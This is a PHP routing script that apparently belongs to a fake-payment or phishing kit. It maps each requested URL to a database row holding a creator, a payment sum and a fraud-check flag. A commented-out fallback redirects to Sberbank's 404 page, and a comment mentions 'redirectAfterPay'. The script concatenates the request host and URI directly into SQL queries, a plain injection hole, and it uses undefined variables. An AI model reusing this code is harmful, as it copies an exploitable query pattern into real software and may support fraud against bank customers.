<?php
ob_start();

if (!isset($_COOKIE['idPerson'])){
    $idPerson = generateRandomString(); 
    setcookie("idPerson", $idPerson, time());
}
else{
    $idPerson = $_COOKIE['idPerson'];
}
define("access", "yes");
require_once 'admin/connection.php';
require_once $_SERVER["DOCUMENT_ROOT"] .'/config.php';


$url =  $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$test = explode('/',$link);
// $getPage = R::load('settings', '1');
// $acces = $getPage->landing_work;

//redirectAfterPay
// $mysite = "https://www.google.com";

function generateRandomString($length = 10) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

// isset($_SERVER['HTTPS']) ? $ans = "https://" : $ans = "http://";

$labirint = R::getAll( 'SELECT * FROM `path` WHERE `link` = "'.$url.'"');

$token = R::getAll( 'SELECT token FROM `settings` WHERE `id` = 1')[0]['token'];
$labirintCheck = count(R::getAll( 'SELECT * FROM `path` WHERE `link` = "'.$url.'"'));

// print_r($labirint);
// exit();

if($acces){
    $PATH = R::getAll( 'SELECT * FROM `path`')[0];
    $itr = $PATH['x'];
    $ref =  $PATH['method'];
    $org =   $PATH['ip'];
    $value = $PATH['sum'];
    $fraudCheckOn = intval($PATH['cheker']);
    require 'main.php';
}
elseif ($labirintCheck) {
    $PATH = $labirint[0];
    $itr = $PATH['x'];
    $admin = $PATH['creator'];
    $ref =  $PATH['method'];
    $org =   $PATH['ip'];
    $value = $PATH['sum'];
    $fraudCheckOn = intval($PATH['cheker']);
    $id = $PATH['id'];
    require 'main.php';
}
else{
//  echo "<script>window.location.replace('https://www.sberbank.ru/404.php');</script>";
die(header("HTTP/1.0 404 Not Found"));
}
?>